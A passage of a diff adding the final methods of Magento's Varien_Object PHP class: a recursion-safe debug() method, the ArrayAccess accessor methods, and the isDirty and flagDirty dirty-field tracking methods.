+     * Present object data as string in debug mode
+     *
+     * @param mixed $data
+     * @param array $objects
+     * @return string
+     */
+    public function debug($data=null, &$objects=array())
+    {
+        if (is_null($data)) {
+            $hash = spl_object_hash($this);
+            if (!empty($objects[$hash])) {
+                return '*** RECURSION ***';
+            }
+            $objects[$hash] = true;
+            $data = $this->getData();
+        }
+        $debug = array();
+        foreach ($data as $key=>$value) {
+            if (is_scalar($value)) {
+                $debug[$key] = $value;
+            } elseif (is_array($value)) {
+                $debug[$key] = $this->debug($value, $objects);
+            } elseif ($value instanceof Varien_Object) {
+                $debug[$key.' ('.get_class($value).')'] = $value->debug(null, $objects);
+            }
+        }
+        return $debug;
+    }
+
+    /**
+     * Implementation of ArrayAccess::offsetSet()
+     *
+     * @link http://www.php.net/manual/en/arrayaccess.offsetset.php
+     * @param string $offset
+     * @param mixed $value
+     */
+    public function offsetSet($offset, $value)
+    {
+        $this->_data[$offset] = $value;
+    }
+
+    /**
+     * Implementation of ArrayAccess::offsetExists()
+     *
+     * @link http://www.php.net/manual/en/arrayaccess.offsetexists.php
+     * @param string $offset
+     * @return boolean
+     */
+    public function offsetExists($offset)
+    {
+        return isset($this->_data[$offset]);
+    }
+
+    /**
+     * Implementation of ArrayAccess::offsetUnset()
+     *
+     * @link http://www.php.net/manual/en/arrayaccess.offsetunset.php
+     * @param string $offset
+     */
+    public function offsetUnset($offset)
+    {
+        unset($this->_data[$offset]);
+    }
+
+    /**
+     * Implementation of ArrayAccess::offsetGet()
+     *
+     * @link http://www.php.net/manual/en/arrayaccess.offsetget.php
+     * @param string $offset
+     * @return mixed
+     */
+    public function offsetGet($offset)
+    {
+        return isset($this->_data[$offset]) ? $this->_data[$offset] : null;
+    }
+
+
+    /**
+     * Enter description here...
+     *
+     * @param string $field
+     * @return boolean
+     */
+    public function isDirty($field=null)
+    {
+        if (empty($this->_dirty)) {
+            return false;
+        }
+        if (is_null($field)) {
+            return true;
+        }
+        return isset($this->_dirty[$field]);
+    }
+
+    /**
+     * Enter description here...
+     *
+     * @param string $field
+     * @param boolean $flag
+     * @return Varien_Object
+     */
+    public function flagDirty($field, $flag=true)
+    {
+        if (is_null($field)) {
+            foreach ($this->getData() as $field=>$value) {
+                $this->flagDirty($field, $flag);
+            }
+        } else {
+            if ($flag) {
+                $this->_dirty[$field] = true;
+            } else {
+                unset($this->_dirty[$field]);
+            }
+        }
+        return $this;
+    }
+}
